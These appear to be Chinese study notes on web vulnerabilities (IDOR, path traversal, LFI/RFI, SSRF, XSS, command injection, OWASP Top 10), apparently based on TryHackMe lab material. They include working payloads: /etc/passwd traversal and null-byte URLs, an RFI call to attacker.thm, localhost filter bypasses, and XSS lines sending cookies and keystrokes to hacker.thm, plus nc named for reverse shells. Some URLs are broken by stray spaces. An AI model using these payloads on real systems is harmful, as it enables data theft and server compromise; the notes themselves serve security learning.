# **什么是IDOR？**  

IDOR代表不安全的直接对象引用，是一种访问控制漏洞。  

当 Web 服务器接收用户提供的输入以检索对象（文件、数据、文档）时，可能会出现此类漏洞，对输入数据过于信任，并且服务器端没有对其进行验证以确认请求的对象是否属于请求它的用户。
 
# 文件包含漏洞

 本地文件包含 ( LFI )、远程文件包含 ( RFI ) 和目录遍历
## 为什么会发生文件包含漏洞？﻿

文件包含漏洞在各种编程语言 的 Web 应用程序中很常见 ，例如编写和实现不佳的PHP 。这些漏洞的主要问题是输入验证，其中用户输入未经清理或验证，并且由用户控制。当输入未经验证时，用户可以将任何输入传递给函数，从而导致漏洞。
## 文件包含的风险是什么？

默认情况下，攻击者可以利用文件包含漏洞泄露数据，例如代码、凭据或与 Web 应用程序或操作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会被结合使用以实现远程命令执行 ( RCE )。

### 路径遍历  

又称为 目录遍历，这是一种网络安全漏洞，允许攻击者读取操作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过操纵和滥用 Web 应用程序的 URL 来利用此漏洞，以查找和访问存储在应用程序根目录之外的文件或目录。

我们可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为。路径遍历攻击（也称为点-点-斜杠攻击）利用双点../将目录向上移动一级。 如果攻击者找到入口点（在本例中为get. php ?file= ），则攻击者可能会发送如下内容：  http ://webapp. thm /get. php ?file=../../../../etc/passwd  

假设没有输入验证，Web 应用程序不会访问/var/www/app/CVs位置的 PDF 文件，而是从其他目录（在本例中为/etc/passwd ）检索文件。每个..条目移动一个目录，直到到达根目录/。然后它将目录更改为/etc，并从那里读取passwd文件。


如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\boot.ini中的boot.ini文件，则攻击者可以根据目标 操作系统版本尝试以下操作：

`http://webapp.thm/get.php?file=../../../../boot.ini`或者

`http://webapp.thm/get.php?file=../../../../windows/win.ini`

### 本地文件包含 ( LFI )﻿

针对 Web 应用程序的LFI攻击通常是由于开发人员缺乏安全意识。对于PHP来说，使用include、require、include_once和require_once等函数通常会导致 Web 应用程序易受攻击。

#### 1.假设 Web 应用程序提供两种语言，用户可以在 EN 和 AR之间进行选择

```php
<?PHP 
	include($_GET["lang"]);
?>
```

上述PHP代码通过 URL 参数lang使用GET请求来包含页面文件。可以通过发送以下HTTP请求来完成调用：http ://webapp. thm /index. php ?lang=EN. php[](http://webapp.thm/index.php?lang=EN.php)来加载英文页面，或访问http ://webapp. thm /index. php ?lang=AR. php来加载阿拉伯语页面，其中 EN. php和AR. php 文件位于同一目录中。

理论上，如果没有任何输入验证，我们可以通过上述代码访问和显示服务器上任何可读文件。假设我们想读取 /etc/passwd 文件，该文件包含有关Linux操作系统用户的敏感信息，我们可以尝试以下操作：http ://webapp. thm /get. php ?file=/etc/passwd

#### **2.** 接下来，在下面的代码中，开发人员决定在函数内指定目录。

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

在上面的代码中，开发人员决定使用 include函数 仅通过 lang参数 调用 语言目录中的PHP 页面  。  

如果没有输入验证，攻击者可以通过将 lang 输入替换为其他操作系统敏感文件（例如 /etc/passwd ）来操纵 URL 。

再次，有效载荷看起来类似于 路径遍历，但包含函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：

http ://webapp.thm/index.php ? lang =../../../../etc / passwd


在这种情况下，我们有以下入口点：`http://webapp.thm/index.php?lang=EN`。如果我们输入无效的输入，例如THM，我们会收到以下错误

```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

错误消息透露了重要信息。通过输入THM，错误消息会显示包含函数的样子： `include(languages/THM.php);`。

如果仔细查看目录，我们可以看出，函数 includes files in the languages 会在条目末尾添加.php `index.php?lang=EN` 。因此，有效输入将如下所示： ，其中文件 EN 位于给定的 languages 目录中，名为EN.php。

此外，错误消息还透露了有关完整 Web 应用程序目录路径的另一条重要信息，即`/var/www/html/THM-4/`

为了利用这一点，我们需要使用`../`目录遍历部分中描述的技巧来获取当前文件夹。让我们尝试以下操作：
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```



请注意，我们使用了 4 ../，因为我们知道路径有四级`/var/www/html/THM-4`。但我们仍然收到以下错误：

```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

看来我们可以离开PHP目录，但 include 函数仍然会读取末尾带有.php 的输入！这告诉我们开发人员指定了要传递给 include 函数的文件类型。为了绕过这种情况，我们可以使用 NULL BYTE，即`%00`。

使用空字节是一种注入技术，其中 URL 编码表示（例如十六进制的 %00 或 0x00）与用户提供的数据一起终止字符串。您可以将其视为试图诱使 Web 应用程序忽略空字节后面的任何内容。

通过在有效负载末尾添加空字节，我们告诉包含函数忽略空字节之后的任何内容，这些内容可能如下所示：

`include("languages/../../../../../etc/passwd%00").".php");` 相当于`include("languages/../../../../../etc/passwd");`

**注意：** %00 技巧已修复，并且不适用于PHP 5.3.4 及更高版本。

### 远程文件包含 - RFI  

远程文件包含 ( RFI ) 是一种将远程文件包含到易受攻击的应用程序中的技术。与LFI一样，当对用户输入进行不当清理时，就会发生RFI ，从而允许攻击者将外部 URL 注入包含函数。RFI 的一个要求是需要启用allow_url_fopen选项。  

  

RFI的风险高于LFI，因为RFI漏洞允许攻击者在服务器上获得远程命令执行 ( RCE )。成功的RFI攻击的其他后果包括：

- 敏感信息披露
- 跨站点脚本（XSS）
- 拒绝服务（DoS）

#### RFI步骤

下图是成功的RFI攻击步骤示例！假设攻击者在自己的服务器上托管一个PHP文件http ://attacker. thm /cmd.txt ，其中cmd.txt包含一条打印消息  Hello THM。

```php
<?PHP echo "Hello THM"; ?>
```

首先，攻击者注入恶意URL，指向攻击者的服务器，例如 http : //webapp.thm/index.php ? lang = http ://attacker.thm/cmd.txt。如果没有输入验证，恶意 URL 就会进入 include 函数。接下来，Web 应用服务器将向恶意服务器发送GET请求以获取文件。结果，Web 应用将远程文件包含到 include 函数中，以在页面内执行PHP文件并将执行内容发送给攻击者。在我们的例子中，当前页面的某个地方必须显示Hello THM消息。

# ssrf 服务器端请求伪造 (SSRF) 漏洞

允许恶意用户导致 Web 服务器向攻击者选择的资源发出额外或编辑的HTTP请求。

要执行SSRF攻击，**攻击者可以操纵易受攻击的软件中的参数值**，有效地创建或控制来自该软件的请求，并将其定向到其他服务器甚至同一服务器。

## **SSRF的类型**

#### SSRF漏洞有两种类型：

第一种是常规SSRF(regular SSRF)，数据会返回到攻击者的屏幕。

第二种是盲SSRF漏洞(blind SSRF)，即发生SSRF，但不会将任何信息返回到攻击者的屏幕。

## 可能存在的位置

### 地址栏中出现完整的url时

### 表单中的影藏字段

### 某部分url

### url的路径

## 防御 

### **拒绝列表**

拒绝列表是指除列表中指定的资源或与特定模式匹配的资源之外的所有请求都被接受。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是本地主机，它可能包含服务器性能数据或其他敏感信息，因此诸如 localhost 和 127.0.0.1 之类的域名将出现在拒绝列表中。攻击者可以通过使用替代的本地主机引用（例如 0、0.0.0.0、0000、127.1、127.*.*.*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的DNS记录的子域（例如 127.0.0.1.nip.io）来绕过拒绝列表。

### **允许列表**

允许列表是指所有请求都会被拒绝，除非它们出现在列表中或与特定模式匹配，例如，参数中使用的 URL 必须以 **https://website. thm开头的规则。** 攻击者可以通过在攻击者的域名上创建子域（例如 https://website. thm .attackers-domain. thm）来快速绕过此规则。应用程序逻辑现在将允许此输入并让攻击者控制内部HTTP请求。

  
### **打开重定向**

如果上述绕过方法不起作用，攻击者还有另一个绝招，那就是开放重定向。开放重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。以链接 https://website. thm /link?url=https://tryhackme.com 为例。创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。但想象一下，存在一个潜在的SSRF漏洞，其严格的规则只允许以 https://website. thm / 开头的 URL。攻击者可以利用上述功能将内部HTTP请求重定向到攻击者选择的域。

# xss 跨站点脚本漏洞

## xss payload

#### **什么是有效载荷？**

在XSS中，payload 是我们希望在目标计算机上执行的 JavaScript 代码。payload 分为两个部分：意图和修改。

#### **概念证明：**

这是最简单的有效载荷，您要做的就是证明您可以在网站上实现XSS。这通常是通过在页面上弹出一个带有文本字符串的警告框来实现的，例如：

`<script>alert('XSS');</script>`

#### **会话窃取：**

用户会话的详细信息（例如登录令牌）通常保存在目标机器的 cookie 中。下面的 JavaScript 会获取目标的 cookie，对 cookie 进行 base64 编码以确保成功传输，然后将其发布到黑客控制的网站进行记录。一旦黑客拥有这些 cookie，他们就可以接管目标的会话并以该用户的身份进行记录。

  

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

  

#### **键盘记录器：**

以下代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制的网站。如果安装有效负载的网站接受用户登录或信用卡详细信息，这可能会造成严重破坏。

  

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

## **Reflected XSS** 反射型xss

当HTTP请求中用户提供的数据未经任何验证就包含在网页源中时，就会发生反射型XSS 。

应用程序不检查**错误**参数的内容，这使得攻击者可以插入恶意代码。

### **如何测试反射型XSS：**  

您需要测试每个可能的入口点；其中包括：

- URL 查询字符串中的参数
- URL 文件路径
- 有时是HTTP标头（尽管实际上不太可能被利用）

## **stored xss 存储型XSS**

顾名思义，XSS负载存储在 Web 应用程序上（例如，存储在数据库中），然后在其他用户访问站点或网页时运行。

### **如何测试存储型XSS：**  

您需要测试每个可能的入口点，数据似乎被存储在这里，然后显示在其他用户可以访问的区域；其中的一个小例子可能是：  

- 博客评论
- 用户个人资料信息  
    
- 网站列表


## **基于 DOM 的XSS**

### **什么是 DOM？**  

DOM 代表**D** ocument **O** bject **M odel，是 HTML 和**XML文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。网页是一个文档，该文档可以显示在浏览器窗口中，也可以作为 HTML 源显示

### **利用 DOM **

基于 DOM 的XSS是指 JavaScript 直接在浏览器中执行，无需加载任何新页面或将数据提交给后端代码。当网站 JavaScript 代码对输入或用户交互起作用时，就会执行。

# **blind XSS 盲XSS**

  
盲 XSS类似于存储型XSS，因为你的有效负载会存储在网站上供其他用户查看，但在这种情况下，你无法看到有效负载的运行情况，也无法先自己测试它。

# 命令注入

存在此漏洞的原因是应用程序经常使用PHP 、Python 和 NodeJS等编程语言中的函数将数据传递到计算机操作系统并在其上进行系统调用。例如，从字段中获取输入并在文件中搜索条目。

## 利用
**例如，shell 运算符&，&&，；将组合两个（或更多）系统命令并同时执行它们

命令注入主要可以通过以下两种方式检测：

1. 盲命令注入
2. 详细命令注入

linux

|          |                                                                         |
| -------- | ----------------------------------------------------------------------- |
| **有效载荷** | **描述**                                                                  |
| who      | 查看应用程序在哪个用户下运行。                                                         |
| ls       | 列出当前目录的内容。您可能会找到配置文件、环境文件（令牌和应用程序密钥）等文件以及更多有价值的东西。                      |
| ping     | 此命令将使应用程序挂起。这在测试应用程序的盲命令注入时很有用。                                         |
| sleep    | 这是在测试未安装盲命令注入的应用程序时另一个有用的有效载荷`ping`。                                    |
| nc       | Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标机器上导航以查找其他服务、文件或潜在的提升权限的方法。 |


windows

|          |                                                    |
| -------- | -------------------------------------------------- |
| **有效载荷** | **描述**                                             |
| who      | 查看应用程序在哪个用户下运行。                                    |
| dir      | 列出当前目录的内容。您可能会找到配置文件、环境文件（令牌和应用程序密钥）等文件以及更多有价值的东西。 |
| ping     | 此命令将使应用程序挂起。这在测试应用程序的盲命令注入时非常有用。                   |
| timeout  | 此命令还将导致应用程序挂起。如果`ping`未安装该命令，它还可用于测试应用程序的盲命令注入。    |
### **易受攻击的功能**

在PHP中，许多函数与操作系统交互以通过 shell 执行命令；这些包括：
- Exec
- Passthru
- System
# owasp top 10
## 注入
- SQL注入：当用户控制的输入被传递给SQL查询时，就会发生这种情况。因此，攻击者可以传入SQL查询来操纵查询的结果。 

- 命令注入：当用户输入被传递给系统命令时，就会发生这种情况。因此，攻击者能够在应用服务器上执行任意系统命令。

#### 防范
- 使用允许列表：当输入发送到服务器时，系统会将此输入与安全输入或字符列表进行比较。如果输入被标记为安全，则会进行处理。否则，它会被拒绝，并且应用程序会抛出错误。
- 剥离输入：如果输入包含危险字符，则在处理之前删除这些字符。

## 身份验证失败
### 缺陷
。身份验证机制中的一些常见缺陷包括：  
  
- 暴力攻击：如果 Web 应用程序使用用户名和密码，攻击者就可以发起暴力攻击，通过多次身份验证尝试来猜测用户名和密码。 

- 使用弱凭据：Web 应用程序应设置强密码策略。如果应用程序允许用户设置诸如“password1”或常用密码之类的密码，那么攻击者可以轻松猜出这些密码并访问用户帐户。他们无需暴力破解或多次尝试即可做到这一点。

- 弱会话 Cookie：会话 Cookie 是服务器追踪用户的方式。如果会话 Cookie 包含可预测的值，攻击者就可以设置自己的会话 Cookie 并访问用户的帐户。


### 措施来缓解损坏的身份验证机制：

- 为避免密码猜测攻击，请确保应用程序实施强密码策略。 
- 为避免暴力攻击，请确保应用程序在一定次数的尝试后强制自动锁定。这将阻止攻击者发起更多暴力攻击。
- 实施多因素身份验证 - 如果用户有多种身份验证方法，例如使用用户名和密码并在移动设备上接收代码，那么攻击者就很难获得这两个凭据来访问他们的帐户。

## 敏感数据泄露

## Broken Access Control

## 安全配置错误
